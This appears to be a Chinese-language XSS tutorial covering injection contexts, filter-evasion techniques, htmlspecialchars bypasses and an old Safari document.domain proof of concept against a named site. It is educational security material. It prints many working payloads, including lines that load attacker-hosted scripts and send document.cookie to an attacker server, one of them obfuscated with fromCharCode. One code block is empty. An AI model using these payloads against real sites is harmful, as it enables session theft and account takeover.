## 理解 XSS 中的上下文

XSS上下文：
- 攻击者可控制数据在响应中出现的位置。
- 应用程序对该数据执行的任何输入验证或其他处理。

常见的上下文:

### HTML 上下文

在 HTML 上下文中，用户控制的输入位于 HTML 元素内。

```html
<div>[用户输入在此]</div>
```

一些有用的执行JavaScript的方式：

```html
<script>alert(document.domain)</script>

<img src=1 onerror=alert(1)>
```

### HTML 标签属性上下文

在属性上下文中，输入被反射到任何 HTML 元素的属性中，例如 input 标签。

```html
<input type="text" value="[用户输入在此]" />
```

当XSS上下文位于HTML标签属性值中时，您有时可能能够终止属性值、关闭标签并**引入一个新标签**。例如：

```html
"><script>alert(document.domain)</script>
```

在这种情况中更常见的是，尖括号被阻止或编码，因此您的输入无法脱离其所在的标签。只要您能够终止属性值，通常可以**引入一个新属性**来创建可脚本化的上下文，例如 JS 事件处理程序。例如：

```html
" autofocus onfocus=alert(document.domain) x="
```

上述载荷创建了一个 `onfocus` 事件，当元素获得焦点时将执行JavaScript，同时添加 `autofocus` 属性以尝试在无需任何用户交互的情况下自动触发 `onfocus` 事件。最后，它添加了 `x="` 来妥善修复后续的标记。

#### href 属性中的 javascript 或 data 伪协议

有时XSS上下文位于某种HTML标签属性中，该属性本身就可以创建可脚本化上下文。在这种情况下，您无需终止属性值即可执行JavaScript。例如，如果XSS上下文位于锚点标签的 `href` 属性中，您可以使用 `javascript` 伪协议来执行脚本。例如：

```html
<a href="javascript:alert(document.domain)">
```

#### 组合键

您可能会遇到一些网站，它们编码尖括号但仍允许您注入属性。有时，即使是在通常不会自动触发事件的标签（如规范标签）中，这些注入也是可能的。您可以在Chrome上利用访问键和用户交互来利用此行为。访问键允许您提供引用特定元素的键盘快捷键。`accesskey` 属性允许您定义一个字母，当与其他键组合按下时（不同平台有所差异），将触发事件 `onclick`
- 组合使用快捷键属性 `accesskey="X"`、点击事件 `onclick="alert(1)"` 
    (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)

> [PortSwigger Research发明的一种技术在隐藏输入字段中利用XSS](https://portswigger.net/research/xss-in-hidden-input-fields)

### JavaScript 中的 XSS

当XSS上下文是响应中的某些现有JavaScript时，可能会出现多种情况，需要不同的技术来成功实施利用。

#### HTML 标签解析顺序终止现有脚本

在最简单的情况下，只需关闭包含现有JavaScript的脚本标签，并引入一些新的HTML标签来触发JavaScript执行。例如，如果XSS上下文如下（字符串中）：

```html
<script>
...
var input = 'controllable data here';
...
</script>
```

那么您可以使用以下载荷来跳出现有JavaScript并执行您自己的代码：

```html
</script><img src=1 onerror=alert(document.domain)>
```

这样做的原因是：浏览器首先执行HTML解析来识别页面元素（包括脚本块），然后才执行JavaScript解析来理解和执行嵌入的脚本。

### 从JavaScript字符串中跳出

在XSS上下文位于带引号的字符串字面量中的情况下，通常可以跳出字符串并直接执行JavaScript。修复XSS上下文之后的脚本至关重要，因为那里的任何语法错误都会阻止整个脚本执行。

一些跳出字符串字面量的有用方法：

```javascript
// 运算符连接
'-alert(document.domain)-'

// 语句分隔
';alert(document.domain)//
```

#### 转义符本身未被转义导致字符串逃逸

某些应用程序试图通过用反斜杠转义任何单引号字符来防止输入跳出JavaScript字符串。字符前的反斜杠告诉JavaScript解析器该字符应按字面意思解释，而不是作为特殊字符（如字符串终止符）。在这种情况下，应用程序常常犯下未能转义反斜杠字符本身的错误。这意味着攻击者可以使用自己的反斜杠字符来中和应用程序添加的反斜杠。

例如，假设输入：

```javascript
';alert(document.domain)//
```

被转换为：

```javascript
\';alert(document.domain)//
```

您现在可以使用添加转义符 `\` 的替代载荷：

```javascript
\';alert(document.domain)//
```

被转换为：

```javascript
\\';alert(document.domain)//
```

在这里，第一个反斜杠意味着第二个反斜杠被按字面解释，而不是作为特殊字符。这意味着引号现在被解释为字符串终止符，因此攻击成功。

#### 载荷混淆：无括号、分号载荷

某些网站通过限制允许使用的字符来增加XSS的难度。这可以在网站层面实现，也可以通过部署WAF来阻止您的请求到达网站。在这些情况下，您需要尝试其他调用函数的方式来绕过这些安全措施。其中一种方法是使用带有异常处理程序的 `throw` 语句，`throw` 语句允许您创建一个包含表达式的自定义异常，该表达式会被发送到 `onerror` 处理程序。这使得您可以在不使用括号的情况下向函数传递参数。以下代码将 `alert()` 函数分配给全局异常处理程序，`throw` 语句将 `1` 传递给异常处理程序（这里是 `alert`）。最终结果是使用 `1` 作为参数调用了 `alert()` 函数。

```javascript
onerror=alert;throw 1
```

有多种方法可以使用此技术来不带括号地调用函数
- https://portswigger.net/research/xss-without-parentheses-and-semi-colons
- https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses
- https://portswigger.net/research/javascript-without-parentheses-using-dommatrix

由于 `throw` 是一个语句，您通常需要在 `onerror` 赋值后面加上分号，以便开始一个新语句而不是形成一个表达式。尝试替换符号：

```js
{onerror=alert}throw 1337
```
- 花括号 `{}` 代码块替代分隔符 `;`


```js
throw onerror=alert,'haha'
```
- 事件处理程序作为表达式在 throw 内执行 `onerror=alert`
- 再使用逗号表达式传递最后的字符串 `'haha'`

如果您尝试运行这段代码，您会注意到 Chrome 会在发送到异常处理程序的字符串前加上 `"Uncaught"` 前缀。

使用 `eval` 作为异常处理程序并计算字符串：在字符串前加上 `=`，这样 `"Uncaught"` 字符串就变成了一个变量，从而执行任意 JavaScript。

```js
{onerror=eval}throw'=alert\x281337\x29'
```
- `throw` 的字符串为 `=alert(1337)"`
- 发送给 `eval` 的字符串是 `"Uncaught=alert(1337)"`

这在 Chrome 上运行良好，但在 Firefox 上，异常会被加上两个单词的前缀 "uncaught exception"，这当然会在求值时导致语法错误。

当您在 Firefox 中使用 `Error` 函数创建异常时，它不包含 "uncaught exception" 前缀，而只有字符串 "Error"

我当然无法调用 `Error` 函数，因为它需要括号，但我想也许如果我使用带有 `Error` 原型属性的对象字面量，可能会模拟这种行为：使用 [Hackability Inspector](http://portswigger-labs.net/hackability/inspector/?input=new%20Error(%27blah%27)) 检查了 Error 对象以查看其属性。我将所有属性添加到对象字面量中，结果成功了！我逐个移除属性，以找到所需的最小属性集合：

```js
{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}
```
- 自定义错误函数创建的异常语句不包含默认的前缀
- 使用错误函数原型的属性模拟错误原型本身
- 发送给 `eval` 的字符串是 `'alert(1)'`

terjanq 移除了所有字符串字面量：

```js
throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]
```
- `/a/` 正则字面量（无关）
- `Uncaught=1` 新建全局变量 `Uncaught` 赋值，之后作为变量使用
- `g=alert` 新建全局变量 `g` 得到 `alert` 函数
- `a=URL+0` 新建全局变量 `a` 得到 `'function URL() { [native code] }0'` 字符串，之后用来索引提取括号字符
    - `URL` 为函数，进行 `+0` 计算时做字符串运算
        `'function URL() { [native code] }'+'0'`
- `onerror=eval` 设置错误处理函数
- `/1/g+a[12]+[1337]+a[13]` 字符串 `/1/g(1337)`
    - `/1/g` 正则表达式，字符串运算时转为字符串 `/1/g`
    - `a[12]+[1337]+a[13]` 提取之前设置字符串的全局变量 `a` 的括号并进行字符串运算 
        `'(1337)'`
- 最终传递 `eval('Uncaught /1/g(1337)')`
    - `Uncaught /1/g(1337)` 解析为对象 
        - `Uncaught=1`
        - `g=alert`
    - 除法运算符连接3个操作数，等价于 `1 / 1/ alert(1337)` 

Pepe 通过使用类型错误将字符串发送到异常处理程序，完全去除了对 `throw` 语句的需求：

```js
TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']
```
- 修改类型错误原型属性的名称字段
    - firefox 从 `"Uncaught TypeError"` 到 `'=/'`
    - chrome 从 `"TypeError"` 到 `'=/'`
- `0[onerror=eval]['/-alert(1)//']`
    - `0[onerror=eval]` 尝试访问数字字面量 `0` 的字段
        - 执行表达式 `onerror=eval` 结果为 `eval`
        - 访问 `0[eval]` 结果为不存在的 `undefined`
    - `undefined['/-alert(1)//']`
        - 访问 `undefined` 抛出类型错误
            - firefox
                `Uncaught TypeError: can't access property "/-alert(1)//" of undefined`
            - chrome
                `Uncaught TypeError: Cannot read properties of undefined (reading '/-alert(1)//')`
- 最终传递 `eval("Uncaught TypeError: Cannot read properties of undefined (reading '/-alert(1)//')")`
    - 之前修改了错误属性名字段为 `=/`
        - firefox
            `=/: can't access property "/-alert(1)//" of undefined`
        - chrome
            `Uncaught =/: Cannot read properties of undefined (reading '/-alert(1)//')`
    - 两个浏览器中均等效为 `x = /正则表达式/ - alert(1) //`
        - 无法直接控制的固定中间字符串被作为正则表达式
        - 使用运算符 `-` 连接函数 `alert(1)` 
        - `//` 注释剩余内容

将载荷作为命名函数保存后（尤其是如 `throw` 作为语句无法用在表达式位置），覆盖 `window` 对象的字符串操作函数 `toString` 后触发调用
```js

```
- `xfunc=_=>{保存为函数的载荷}`
    构造自定义无参数命名函数
- `toString=xfunc`
    使用之前的自定义函数，覆盖 `window` 对象的字符串操作方法 `toString` 
- `window+''`
    `window` 对象进行字符串操作，触发被覆盖的 `toString` 方法，调用自定义函数


滥用 DOMMatrix 来调用 `alert(1337)` （核心仍为字符串操作函数与此时的参数）：

```javascript

matrix = alert;
x.a = 1337;
location = 'javascript' + ':' + x;
```
- DOMMatrix 对象
    - 新矩阵对象 `DOMMatrix` 字段
        ```js
        → new DOMMatrix
        ← DOMMatrix { a: 1, b: 0, c: 0, d: 1, e: 0, f: 0, m11: 1, m12: 0, m13: 0, m14: 0 }
        ```
    - 矩阵对象字符串操作
        ```js
        → new DOMMatrix + ''
        ← "matrix(1, 0, 0, 1, 0, 0)" 
        ```
        - `matrix` 的参数1~6分别对应 `a` ~ `f` 6个字段
    - 矩阵对象参数1 `.a` 或 `.m11`，参数2 `.b` 或 `.m12`
        > 若设置 `.m13` 则字符串操作函数转为 3D 函数 `matrix3d`
- `matrix = alert;`
    覆盖 2D 矩阵对象的字符串操作函数 `matrix` 为 `alert` 
- `x.a = 1337;`
    设置 2D 矩阵对象的字符串操作函数的参数1为 `1337`
- `location = 'javascript' + ':' + x;`
    `location` 设置 JS 伪协议，触发 2D 矩阵对象字符串操作
    - 触发矩阵对象字符串操作，设置 `matrix(1337,...)` 函数字符串
    - `location` 最终触发 JS 伪协议执行
        - 最终为 `alert(1337, 0, 0, 1, 0, 0)`
        - `alert` 取第一个参数，并忽略冗余参数

### 利用HTML编码

当XSS上下文是带引号标签属性（如事件处理程序）中的某些现有JavaScript时，可以利用HTML编码来绕过某些输入过滤器。

当浏览器解析完响应中的HTML标签和属性后，会在进一步处理之前对标签属性值进行HTML解码。如果服务器端应用程序阻止或过滤了成功利用XSS所需的某些字符，您通常可以通过对这些字符进行HTML编码来绕过输入验证。

例如，如果XSS上下文如下：

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

并且应用程序阻止或转义单引号字符，您可以使用以下载荷跳出JavaScript字符串并执行您自己的脚本：

```html
&apos;-alert(document.domain)-&apos;
```

`&apos;` 序列是表示撇号或单引号的HTML实体。由于浏览器在JavaScript被解释之前对 `onclick` 属性的值进行HTML解码，这些实体被解码为引号，成为字符串分隔符，因此攻击成功。

### JavaScript模板字面量中的XSS 

JavaScript模板字面量是允许嵌入JavaScript表达式的字符串字面量。嵌入的表达式被求值，并通常被连接到周围的文本中。模板字面量使用反引号而不是普通引号括起来，嵌入表达式使用 ``` `${...}` ``` 语法标识。

例如，以下脚本将打印一条包含用户显示名称的欢迎消息：

```javascript
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

当XSS上下文位于JavaScript模板字面量中时，无需终止该字面量。相反，您只需使用 `${...}` 语法嵌入一个JavaScript表达式，该表达式将在字面量被处理时执行。例如，如果XSS上下文如下：

```html
<script>
...
var input = `controllable data here`;
...
</script>
```

那么您可以使用以下载荷来执行JavaScript而无需终止模板字面量：

```javascript
${alert(document.domain)}
```

### 通过客户端模板注入实现XSS

### 小结

如果载荷不起作用，检查返回的文档中是否因载荷导致语法错误。在代理中检查返回的文档，查找未闭合标签或其他语法问题。也可以打开浏览器的开发者控制台，查看页面加载时是否有错误。在 Firefox 中，右键点击页面选择 “检查元素” → “控制台” 即可打开控制台。

每个上下文需要不同的有效载荷来形成有效的 HTML 标记，以便执行 JavaScript。以下是每个上下文中为触发 XSS 所需提供的输入示例：

常见 XSS 载荷

- `<script>alert(1)</script>` 
    最通用的 XSS 载荷，成功时生成弹窗
- `<iframe src=javascript:alert(1)>` 
    在 iframe 中加载 JavaScript 代码，当 `<script>` 标签被禁止时有用
- `<body onload=alert(1)>` 
    HTML 元素的事件监听器，当输入字符串不能包含 “script” 时有用
- `"><img src=x onerror=prompt(1);>` 
    闭合前一个标签，注入一个无效源 URL 的 `<img>` 标签，加载失败时执行 `onerror` 中的 JavaScript
- `<script>alert(1)<!--` 
    `<!--` 是 HTML 注释的开始，注释掉文档剩余部分以防止语法错误
- `<a onmouseover="alert(1)">test</a>` 
    插入一个链接，当用户鼠标悬停时执行 JavaScript
- `<script src=//attacker.com/test.js>` 
    使浏览器从攻击者服务器加载并运行外部脚本

### XSS polyglot 多上下文载荷 - 泛用型模糊测试载荷

当搜索 XSS 汇时，浏览器包含多种潜在的上下文，每种上下文期望非常特定类型的载荷。例如，在 `eval()` 函数中正确执行的 XSS 载荷很可能与 `element.innerHTML` 中的不同。因此，如果按上下文逐个开发载荷，寻找可行的 XSS 载荷可能是一个极其漫长的过程。

多语言载荷是一种独特的测试工具，可以节省大量时间，因为多语言载荷是能够在各种浏览器上下文中执行脚本的 XSS 载荷。

以下多语言载荷由 GitHub 用户 0xSobky 于 2018 年发布，它能够在十多种常见 XSS 上下文中执行脚本：

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/**/oNcliCk=alert() )
//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>
\x3csVg/<sVg/oNloAd=alert()//>\x3e`
```

一些兼容上下文示例如下：

- **双引号标签属性**：`<input type="text" value="<polyglot>"></input>`
- **单引号标签属性**：`<input type='text' value='<polyglot>'></input>`
- **无引号标签属性**：`<input type=text value=<polyglot>></input>`
- **HTML 注释**：`<!-- <polyglot> -->`
- **HTML 标签**：`<title><polyglot></title>`
- **JavaScript 单引号字符串**：`var str = "<polyglot>";`

此有效载荷在大多数上下文中都能执行 XSS。安全研究员 "Ahmed Elsobky" 编制了一份多样化的 XSS polyglot 列表，至今仍是一个极好的参考 [https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot]。
查看此载荷的所有测试执行上下文，并将其（以及类似的多语言载荷）记在心中，以便在寻找可行的 XSS 利用时大幅减少繁琐工作。

### 其他测试

另一种更高效的测试方法是使用通用测试字符串而非完整 XSS 载荷。插入一串 XSS 载荷中常用的特殊 HTML 字符，例如：`>'<"//:=;!--`。注意哪些字符被应用程序转义，哪些直接渲染。然后，你可以根据已知应用程序未正确清理的字符来构造测试 XSS 载荷。

盲 XSS 漏洞更难检测，因为你无法通过查找反射输入来发现它们，因此无法通过尝试生成警告框来测试。相反，尝试让受害者浏览器向你拥有的服务器发出请求。例如，你可以提交以下载荷，它会使受害者浏览器请求你服务器上的 `/xss` 页面：

```html
<script src='http://YOUR_SERVER_IP/xss'></script>
```

然后监控服务器日志，看是否有人请求该页面。如果你看到对路径 `/xss` 的请求，说明盲 XSS 已被触发！

最后，虽然黑客通常手动发现新的 XSS 向量，但通过模糊测试自动检测已知 XSS 向量也是一种好方法。


## 绕过过滤器

在使用任何形式的 XSS 攻击应用时，最常见的陷阱之一是客户端过滤阻止了载荷执行。只有一小部分网站使用了最优秀的清理/过滤技术，如 Cure53 的 DOMPurify。其余网站要么使用无过滤、内部开发的过滤，要么使用未经广泛测试的库或框架。

> DOMPurify 是一个行业标准的 XSS 清理器，它利用许多底层 JavaScript 和 DOM API 来保护 HTML、MathML 和 SVG 文件

由于 DOM 和 JS 规范非常复杂，JavaScript 载荷可以通过许多非常规方式执行，从而绕过仅查找常见或标准 JavaScript 载荷的过滤系统。

应用程序检测和纠正无效输入的方式是防止 XSS 的一个主要弱点。黑名单可能不包含所有可能的攻击字符串，白名单可能过于宽松，清理可能失败，或者某种输入类型可能被错误信任而未清理。所有这些都允许攻击者绕过 XSS 过滤器。

[XSS 过滤规避速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)记录了常见的过滤规避测试。

### 自闭合 HTML 标签

浏览器的一个独特怪癖是，虽然不带闭合标签的 HTML 标签被认为是无效的，但如果检测到一个没有闭合的开标签，浏览器会尝试闭合该标签。

> 这种行为也见于许多 XML、PDF 和 SVG 解析工具。每个实现都有自己独特的错误修正，因此学习这些工具的怪癖可能会让您洞察可能的攻击向量。

许多客户端过滤工具会评估标签对，因此损坏的 `<script>` 标签可能能够绕过所述过滤，然后被浏览器重新生成（因此能够执行脚本）。一个示例如下：

```html
<script>alert() // 实际代码
<script>alert()<script> // 浏览器“修复后”的代码
```

这是一种简单的技术，每次尝试所需工作量很小。更复杂的技术建立在这种自我修复或错误纠正行为之上。

### 协议相对 URL

协议相对 URL（PRURL）是主流浏览器都支持的一种遗留机制，允许浏览器选择打开链接的协议。这种 URL 模式被认为是一种安全反模式，因为浏览器可能使用不太安全的协议选项打开链接（例如打开 `http://` 而非 `https://`）。然而，由于大多数浏览器仍支持 PRURL 方案，它成为了绕过常见 XSS 载荷过滤器的有效方式。

使用这些 URL 的方法很简单。如果过滤脚本试图撤销对外部 URL 的脚本或 HTML 载荷的引用，只需移除 HTTP 或 HTTPS 协议，改用 `//`。一旦脚本加载到 DOM 中，浏览器会选择看起来最相关的方案，这通常会导致过滤绕过，因为大多数过滤发生在 DOM 节点实例化之前。

下面展示了两个 PRURL 链接示例：

```html
<a href="https://evil-website.com">click</a> <!-- 被过滤 -->
<a href="//evil-website.com">click</a> <!-- 未被过滤 -->
```

请注意，如果您正在测试一个 Web 应用并且可以直接联系该应用的开发者，您应建议他们避免使用 PRURL，原因如上所述。

### 畸形标签

现代浏览器具有恢复性代码，以帮助解析格式异常的 HTML 标签。这通常意味着更正包含字符串的引号的位置、数量或类型。由于过滤库在 DOM 加载之前检查代码，畸形标签可能通过过滤，但在浏览器完成修复标签语法的繁重工作后完美执行。

用于超链接的 `<a>` 标签就是这样一个标签，大多数浏览器会尝试纠正不正确的引号。以下是 Chrome 在首次渲染之前会将其恢复为完整功能的两个无效 `<a>` 标签：

```html
\<a onmouseover="alert(document.cookie)"\>xxs\</a\>
\<a onmouseover=alert(document.cookie)\>xxs\</a\>
```

最新版本的 Chrome 也使用类似的引擎纠正 `<img>` 标签，允许如下载荷在浏览器逻辑清理后不受阻碍地执行：

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

许多安全研究人员在网上发布了类似的畸形攻击载荷。研究这些载荷可以让您深入了解如何更好地开发自己的畸形载荷。


### 大小写与编码转换

混合使用不同编码和大小写来迷惑 XSS 过滤器。例如，如果过滤器只过滤字符串 “script”，可以在载荷中将某些字母大写。由于浏览器解析 HTML 时通常很宽容，允许较小的语法问题（如大小写），这不会影响脚本标签的解释：

```html
<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
```

如果应用程序过滤特殊 HTML 字符（如单引号和双引号），你就无法直接在 XSS 载荷中编写字符串。但你可以尝试使用 JavaScript 的 `fromCharCode()` 函数，它将数字代码映射到对应的 ASCII 字符，从而创建你需要的字符串。例如，以下代码等同于字符串 `"http://attacker_server_ip/?c="`：

```javascript
String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)
```

这意味着你可以构造不带引号的 XSS 载荷，如下所示：

```html
<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
```

`String.fromCharCode()` 函数在给定 ASCII 字符代码列表后返回一个字符串。你可以使用在线 JavaScript 编辑器（如 https://js.do/）运行 JavaScript 代码，或将其保存为 HTML 文件并在浏览器中加载，从而将你的攻击字符串转换为 ASCII 数字序列：

```html
<!-- 遍历字符串获取对应的 ASCII 码 -->
<script>
  function ascii(c) {
    return c.charCodeAt();
  }
  encoded = "INPUT_STRING".split("").map(ascii);
  document.write(encoded);
</script>
```

`ascii()` 函数 ① 将字符转换为对应的 ASCII 数字表示。我们将输入字符串中的每个字符通过 `ascii()` ② 运行。最后，我们将转换后的字符串写入文档 ③。让我们用此代码转换载荷 `http://attacker_server_ip/?c=`：

```html
<script>
  function ascii(c) {
    return c.charCodeAt();
  }
  encoded = "http://attacker_server_ip/?c=".split("").map(ascii);
  document.write(encoded);
</script>
```

此 JavaScript 代码应输出 `"104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61"`。然后你可以使用 `fromCharCode()` 方法构造载荷。

- `<scr<script>ipt>alert(document.cookie)</script>` 预期被删除的冗余字符串，第一次删除后拼接为有效标签

### 字符编码转义

大多数过滤库在将 JavaScript 代码和 HTML 交给浏览器进行评估、编译和渲染之前，会对其执行某种静态分析。由于静态分析在浏览器有机会生成节点和构建抽象语法树（AST）之前执行，静态分析检查必须查找精确的 JavaScript 和 HTML 语法。

在载荷中可以替换表示字符串、字符和数字的替代但有效的格式，这通常可以绕过过滤。Unicode 是实现此目的的最佳编码形式之一。

在 JavaScript 代码中，Unicode 字符可以随时替换拉丁字符。要在 JavaScript 脚本中写入 Unicode 字符，只需引入反斜杠后跟拉丁字符 “u”（例如 `\u`），然后是一个四位长度的十六进制字符串（0–9，A–F），表示您要添加到代码中的 Unicode 字符（例如 `\u006c`）。网上有许多资源提供 Unicode 到拉丁字符的映射。Unicode 自 1987 年以来就存在，因此不仅得到广泛支持，而且在线和离线资料中都有大量关于 Unicode 的文档。考虑以下 JavaScript 代码片段：

```javascript
alert(1); // 由于标准拉丁字符，被过滤器阻止
```

这个 `alert(1)` 会被许多常见过滤脚本阻止，因为它是测试 XSS 载荷最常用的函数。然而，相同的脚本可以用多种 Unicode 方式编写：

```javascript
\u0061lert(1) // alert(1)，替换了 "a"
a\u006cert(1) // alert(1)，替换了 "l"
\u0061\u006c\u0065\u0072\u0074(1) // alert(1)，替换了所有字符
```

通常，这种编码尽管对 JavaScript 解释器有效且能够执行脚本，但会绕过过滤。这些字符替换很容易在浏览器开发者控制台中测试，在 Mac 上可通过 Command-Option-I 访问，在 Windows 或 Linux 版 Chrome 浏览器中可通过 F12 或 Control+Shift+I 访问。

### 示例：绕过 htmlspecialchars

通过不同上下文传递的输入在反射到应用程序响应之前必须进行编码或清理。为此，几种服务器端语言提供了内置函数；如今许多框架默认应用这些函数，从而减轻了开发人员的负担。

PHP 中一个这样的流行函数是 `htmlspecialchars`；它可用于将特殊字符转换为 HTML 实体，以尝试防止 XSS。然而，该解决方案并不适用于所有上下文，并且在某些情况下可以被绕过。为了理解其工作原理，请考虑以下代码，它通过 GET 参数 `x` 接收输入，并在反射到应用程序响应之前通过 `htmlspecialchars` 函数传递。

**示例**
```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['x'])) {
    echo htmlspecialchars($_GET['x']);
}
?>
```

当提供常见的 XSS 向量 `<script>alert(1);</script>` 时，`<` 和 `>` 等字符被转换为等效的 HTML 实体

#### 不带 ENQUOTES 的 htmlspecialchars

虽然属性通常用双引号（`"`）括起来，但开发人员可能选择使用带有单引号（`'`）的属性。

**示例**
```html
<input type=text value='tmgm'>
```

默认情况下，如果 `htmlspecialchars` 函数没有使用 `ENT_QUOTES` 标志，该函数将仅转换 `&`、`"`、`<` 和 `>` 为相应的 HTML 实体；但是单引号（`'`）将保持不变，可能导致 XSS 漏洞。当输入在属性上下文中反射，且使用单引号封装输入时，尤其如此。

通过提交以下有效载荷，我们可以使用单引号（`'`）跳出 value 字段，从而允许我们插入额外属性，如事件处理程序，并形成有效的标记以执行 JavaScript。

**有效载荷：**
```
' onmouseover=alert(document.domain) x='
```

由于使用了 `onmouseover` 事件处理程序，当用户悬停在输入字段上时，JavaScript 将执行。

#### 4.8 绕过带 ENQUOTES 的 htmlspecialchars

类似地，当输入在锚点标签 `<a>` 的 href 属性内反射时，无需跳出上下文即可执行 JavaScript，因为它可以在 href 属性内完美执行。

**示例**
```html
<a href="此处输入">链接</a>
```

在此上下文中，可以使用 JavaScript 格式的 URI 触发 XSS：

**有效载荷**
```
javascript:alert(1)
```

由于 `htmlspecialchars` 函数进行 HTML 编码的字符在属性中被 HTML 解码，而 JS 载荷可继续执行，于是此该函数在当前上下文中无效。

#### 在 SVG 上下文中绕过 htmlspecialchars

在一种场景中，Web 应用程序使用带有 `ENT_QUOTES` 的 `htmlspecialchars` 函数过滤用户输入并将其反射到 SVG 上下文中，仍然可以执行 JavaScript。我们来看以下示例：

**示例**
```html
<svg><script>let myvar="YourInput";</script></svg>
```

为了跳出 `myvar` 变量的上下文，我们将提供以下有效载荷：

**有效载荷**
```
";alert(1)//
```

由于 `htmlspecialchars` 函数生效，它将引号（`"`）编码为 `&quot;`。然而，JavaScript 仍然会执行。

**响应**
```html
<svg><script>let myvar="text&quot;;alert(1)//";</script></svg>
```

其原理如下：当 HTML 解析器遇到 `<script>` 标签时，它会将内部所有内容解释为 JavaScript 代码。由于解析器不将 HTML 实体 `&quot;` 识别为双引号，因此它将其视为字符串的一部分。然而，当浏览器处理 SVG 标签时，它会对 SVG 内容应用 XML 解析规则。因此，XML 解析器将 `&quot;` 转换回双引号（`"`），从而允许它跳出属性上下文并执行 JavaScript。

虽然此场景是人为构造的，但它展示了修复 XSS 漏洞的复杂性。一种可能的解决方法是双重编码字符，而不是单次编码。

## 利用浏览器漏洞实现 XSS

不同的浏览器可能以不同的方式解释 HTML、CSS 和 JavaScript，对 `javascript:` 和 `data:` 等协议的处理方式也可能不同，并且可能具有不同的 DOM 实现。因此，这些特定于浏览器的怪癖和特性可用于利用边缘情况 XSS。我们来看一个关于 `document.domain` 属性及其在旧版 Safari 中影响的示例。

### SOP 与 document.domain

在同源策略（SOP）下，两个子域不能相互交互。换句话说，在 `vulnerable.example.com` 上的脚本无法访问或修改 `subdomain.example.com` 上的内容，反之亦然。为了促进交互，我们可以使用 `document.domain` 属性。通过在两个域上设置 `document.domain = "example.com"`，将有效地允许浏览器将它们视为属于同一源。

这在 HTML5 功能（如跨域资源共享（CORS））变得普遍之前，常用于放宽 SOP 的规则。

这只有在两个子域共享同一主域时才有可能，但如果我们有不同的域，如 `evil.com` 和 `target.com`，并且我们可以将两者的 `document.domain` 属性设置为顶级域（TLD）如 `com`，会怎样？理论上，这将导致它们被视为具有相同的源。然而，在现代浏览器中，将 TLD `com` 或任何其他 TLD（如 .net、co.uk）分配给 `document.domain` 属性将导致错误。

然而，在旧版 Safari 中，可以在不同域之间将 `document.domain` 属性设置为 `com`，允许它们被视为同一源。为了利用这一点，需要找到网站中允许从用户控制的输入设置 `document.domain` 的漏洞。

考虑以下来自 `legal.yandex.com` 的易受攻击代码，它允许用户设置 `document.domain`：

**易受攻击的代码**
```javascript
function closer() {
    q = location.hash.substr(1).split('&');
    for (var i = 0, l = q.length; i < l; i++) {
        var p = q[i].split('=');
        params[decodeURIComponent(p[0])] = decodeURIComponent(p[1]);
    }
    try {
        if (params['ddom']) {
            document.domain = params['ddom']; //Setting document.domain property
        }
        var cbobj = window.opener.Lego.block['i-social'].broker;
        if (params['status'] == 'ok') {
            cbobj.onSuccess(params);
        } else {
            cbobj.onFailure(params);
        }
        window.close();
    } catch (e) {
        window.close();
    }
}
```

在此代码中，URL 哈希中的 `ddom` 参数可用于设置 `document.domain`，可能设置为 TLD，如 `com`：

**有效载荷**
```
legal.yandex.com/social-closer.html#ddom=com
```

接下来，为了引用它，我们将 `jsbin.com` 上的 `document.domain` 设置为 `com`，使其看起来在同一源上，并访问 `alert(location)` 属性。

**POC**
```html
<!-- 托管在 jsbin.com 或任何其他域 -->
<iframe src="legal.yandex.com/social-closer.html#ddom=com" onload="top[0].eval('alert(location)')"></iframe>
<script>
document.domain = 'com';
</script>
```

其中：`top[0]` 选择攻击者页面(`top`)的第一个子框架元素(`[0]`)，`.eval()` 在作为子框架加载的目标页面 DOM 中执行攻击者设置的代码。加载完成后，攻击者页面与作为子框架加载的目标页面同源，于是在攻击者页面的 JS 中无障碍访问目标 DOM 并执行任意代码
